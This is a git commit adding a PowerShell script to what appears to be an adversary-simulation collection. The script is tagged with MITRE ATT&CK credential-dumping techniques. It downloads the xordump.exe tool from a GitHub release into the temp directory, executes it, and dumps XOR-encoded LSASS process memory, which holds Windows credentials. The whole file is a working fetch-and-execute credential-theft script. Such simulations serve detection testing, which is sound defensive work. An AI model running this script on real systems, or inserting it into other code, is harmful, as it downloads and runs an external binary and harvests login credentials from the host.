782e871e8d61b682a0d6515b7f9ef30f90459680
mthcht <mathieuchotplassot@gmail.com>
2023-01-16 19:08:01 +0100

    Create dump_lsass_with_xordump.ps1

---
+++ Simulation/Windows/System/dump_lsass_with_xordump.ps1
@@ -0,0 +1,31 @@
+<#
+    T1003.001 - OS Credential Dumping: LSASS Memory
+    T1204.002 - User Execution: Malicious File
+    T1588.001 - Obtain Capabilities: Malware
+    Dump lsass with xordmp.exe (Dump LSASS.exe using imported Microsoft DLLs)
+#>
+
+
+# Download and execute xordump.exe
+$url = "https://github.com/audibleblink/xordump/releases/download/v0.0.2/xordump.exe"
+$outfile = "$env:tmp\xordmp.exe"
+$dumpfile = "$env:tmp\xordump_lsass_dump.dmp"
+try {
+    Invoke-WebRequest $url -OutFile $outfile 
+    if (Test-Path $outfile){
+        Write-Host -ForegroundColor Green "Success: xordump downloaded to $outfile"
+        &"$outfile" -out $dumpfile -x 0x41
+    }
+    else{
+        Write-Host -ForegroundColor Red "Error: xordump not found, download failed"
+    }
+    if(test-path $dumpfile){
+        Write-Host -ForegroundColor Green "Success: Dumped lsass.exe memory to $dumpfile"
+    }
+    else{
+        Write-Host -ForegroundColor Red "Error: Failed to Dump lsass.exe memory to $dumpfile"
+    }
+}
+catch {
+    Write-Error $_
+}
